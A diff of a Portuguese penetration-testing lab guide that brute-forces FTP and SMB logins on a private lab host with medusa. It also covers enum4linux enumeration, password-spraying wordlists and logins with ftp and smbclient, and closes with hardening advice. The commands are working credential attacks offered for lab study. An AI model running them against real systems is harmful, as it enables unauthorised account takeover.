@@ -36,7 +36,7 @@ nmap -sV -p 21,22,80,139,445 192.168.56.101
 
 Objetivo: força bruta contra usuário conhecido (ex: admin) com uma wordlist pequena.
 
-Exemplo: testar usuário admin com wordlists no host 192.168.56.101
+Testar usuário admin com wordlists:
 
 ```bash
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
@@ -51,7 +51,7 @@ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 -T 6 threads (ajuste conforme ambiente)
 -f encerra ao encontrar credenciais válidas
 
-Validação: após encontrar credenciais, faça login com ftp:
+Validação, após encontrar credenciais faça login com ftp:
 
 ```bash
 ftp 192.168.56.101
@@ -76,24 +76,22 @@ Validação: tente fazer login no navegador usando as credenciais encontradas
 * Enumerar usuários (usar enum4linux)
 * Fazer password spraying: testar um conjunto pequeno de senhas em muitos usuários (evita lockouts por tentativa excessiva em um único usuário).
 
-# Enumeração com enum4linux
+Enumeração com enum4linux:
 
 ```bash
 enum4linux -a 192.168.56.101 | tee enum4_output.txt
 ```
-#Crie wordlists conforme ajuste:
+Crie wordlists conforme ajuste:
 
 ```bash
 echo -e "user\nmsfadmin\nservice" > smb\_users.txt
-```
 
-```bash
 echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas spray.txt
 ```
 
 Medusa smbnt (sintaxe genérica — ajuste conforme versão):
 
-# Usando arquivo de usuários (-U) e uma pequena wordlist (-P)
+Usando arquivo de usuários (-U) e uma pequena wordlist (-P)
 
 ```bash
 medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
@@ -102,7 +100,7 @@ medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 5
 * Os parâmetros -t 2 (threads) -T 50 (timeout em segundos)
 * ferramentas SMB de brute‑force normalmente tentam combinações de usuário × senha. Se você fornece uma lista de usuários e uma lista de senhas, a ordem pode ser: vertical (por usuário): para cada usuário tenta muitas senhas; ou horizontal / spraying: para vários usuários tenta poucas senhas comuns.
 
-Validação: se houver credenciais válidas, usar smbclient para acesso:
+Validação, se houver credenciais válidas, usar smbclient para acesso:
 
 ```bash
 smbclient -L //192.168.56.20 -U msfadmin
@@ -117,5 +115,6 @@ smbclient -L //192.168.56.20 -U msfadmin
 * Hardening: desabilitar serviços desnecessários; configurar FTP seguro (SFTP/FTPS) ou desativar FTP.
 * Whitelist de IPs para serviços administrativos, quando aplicável.
 * Educação: conscientizar sobre reutilização de senhas e engenharia social.
+
 
 
